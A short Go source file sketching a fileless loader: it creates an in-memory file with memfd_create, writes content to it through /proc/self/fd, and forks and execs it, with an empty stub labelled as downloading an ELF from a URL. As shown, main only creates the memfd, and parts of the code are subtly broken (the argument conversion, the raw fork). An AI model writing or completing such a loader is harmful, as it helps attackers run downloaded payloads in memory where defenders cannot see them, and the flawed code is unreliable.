package main

import (
	"fmt"
	"os"
	"syscall"

	"golang.org/x/sys/unix"
)

// Create a MemFd pointer
func MemfdCreate(name string) int {
	fmt.Printf("Creating memfd %v", name)
	fd, err := unix.MemfdCreate(name, 0)
	if err != nil {
		fmt.Printf("MemfdCreate Error: %v", err)
		unix.Exit(0)
	}
	return fd
}

// Downloads ELF from URL
func retrieveFile() {

}

// Write Content
func WriteToMemfd(fd int, content string) {
	fmt.Printf("Writing to MemFd Pointer")
	filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
	f, err := os.OpenFile(filepath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error Opening File: %v", err)
		unix.Exit(0)
	}
	_, err = fmt.Fprint(f, content)
	if err != nil {
		fmt.Printf("Error Writing to File: %v", err)
	}
}

func ExecMemfd(fd int) {
	pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
	if pid == 0 {
		print("Executing Memfd Pointer")
		filepath := fmt.Sprintf("/proc/self/fd/%v", fd)
		args := [1]string{string(fd)}
		unix.Exec(filepath, args[:], os.Environ())
	}
}

func main() {
	fd := MemfdCreate("psovaya")
	fmt.Printf("FD is %v", fd)
	//WriteToMemfd(fd, content)

}
